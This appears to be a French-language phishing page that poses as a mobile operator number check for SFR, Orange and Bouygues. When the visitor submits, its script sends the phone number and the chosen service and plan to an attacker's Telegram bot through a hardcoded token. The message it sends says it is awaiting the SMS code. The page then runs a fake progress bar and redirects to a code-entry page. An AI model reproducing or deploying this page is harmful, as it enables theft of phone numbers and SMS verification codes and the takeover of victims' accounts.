<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>V√©rification num√©ro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
        .container{max-width:420px;width:100%;}
        .back{position:absolute;top:20px;left:20px;color:#00ff88;font-size:1.6em;text-decoration:none;}
        .card{background:#111;border-radius:28px;padding:50px 30px;box-shadow:0 20px 60px rgba(0,255,136,0.15);border:1px solid #1a1a1a;}
        h1{font-size:2.4em;font-weight:700;color:#fff;text-align:center;margin-bottom:15px;}
        p{color:#888;text-align:center;font-size:1.1em;margin-bottom:40px;}
        .info{color:#666;text-align:center;font-size:0.95em;margin-bottom:30px;}
        input{width:100%;padding:22px;background:#1a1a1a;border:2px solid #333;border-radius:18px;color:#fff;font-size:1.6em;text-align:center;letter-spacing:4px;transition:0.3s;}
        input:focus{outline:none;border-color:#00ff88;box-shadow:0 0 0 4px rgba(0,255,136,0.2);}
        .btn{background:#00ff88;color:#000;padding:20px;border:none;border-radius:50px;font-size:1.4em;font-weight:700;width:100%;margin-top:40px;cursor:pointer;transition:0.3s;box-shadow:0 10px 30px rgba(0,255,136,0.4);}
        .btn:hover{background:#00ffaa;}
        .btn:disabled{background:#333;color:#666;cursor:not-allowed;box-shadow:none;}
        .progress{margin-top:40px;height:8px;background:#1a1a1a;border-radius:4px;overflow:hidden;display:none;}
        .bar{height:100%;width:0%;background:#00ff88;transition:width 0.3s ease;}
        .loader{display:none;width:50px;height:50px;border:6px solid #1a1a1a;border-top:6px solid #00ff88;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
        .status{text-align:center;margin-top:20px;color:#00ff88;font-weight:600;font-size:1.1em;display:none;}
        .error{color:#ff4444;margin-top:20px;text-align:center;font-weight:600;}
    </style>
</head>
<body>
    <a href="plans.html" class="back">‚Üê</a>
    <div class="container">
        <div class="card">
            <h1>V√©rification num√©ro</h1>
            <p>Op√©rateurs accept√©s : SFR ¬∑ Orange ¬∑ Bouygues</p>
            <p class="info">Free / Sosh / autres = refus√©</p>

            <input type="tel" id="phone" placeholder="+33 6 __ __ __ __" maxlength="19" required autofocus>

            <div id="error" class="error"></div>

            <button class="btn" id="btn">V√©rifier mon num√©ro</button>

            <div class="progress" id="progress"><div class="bar" id="bar"></div></div>
            <div class="loader" id="loader"></div>
            <div class="status" id="status"></div>
        </div>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        document.getElementById('btn').addEventListener('click', async () => {
            const phone = document.getElementById('phone').value.trim();
            const error = document.getElementById('error');
            const btn = document.getElementById('btn');
            const progress = document.getElementById('progress');
            const bar = document.getElementById('bar');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            error.textContent = '';

            const clean = phone.replace(/[\s+()-]/g, '');
            if (!/^(\+33|0)[67]\d{8}$/.test(clean)) {
                error.textContent = 'Format invalide';
                return;
            }

            const prefix = clean.slice(-9, -7);
            const valid = ['60','61','62','63','64','65','66','67','68','69','70','75','76','77','78','79'];
            if (!valid.includes(prefix)) {
                error.textContent = 'Num√©ro refus√© ‚Äì SFR / Orange / Bouygues uniquement';
                return;
            }

            // Envoi du num√©ro √† Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `üì± NUM√âRO VALIDE RE√áU\nService: ${localStorage.getItem('selectedService')}\nPlan: ${localStorage.getItem('selectedPlan')}\nNum√©ro: ${phone}\nEn attente du code SMS...`
                })
            });

            btn.disabled = true;
            btn.textContent = 'V√©rification en cours...';
            progress.style.display = 'block';
            loader.style.display = 'block';
            status.style.display = 'block';
            status.textContent = 'Connexion √† l‚Äôop√©rateur...';

            let t = 0;
            const int = setInterval(() => {
                t += 1.667;
                bar.style.width = t + '%';
                if (t > 30) status.textContent = 'Analyse du profil...';
                if (t > 60) status.textContent = 'Validation finale...';
            }, 1000);

            setTimeout(() => {
                clearInterval(int);
                localStorage.setItem('tempPhone', phone);
                window.location.href = 'code.html';
            }, 30000);
        });
    </script>
</body>
</html>
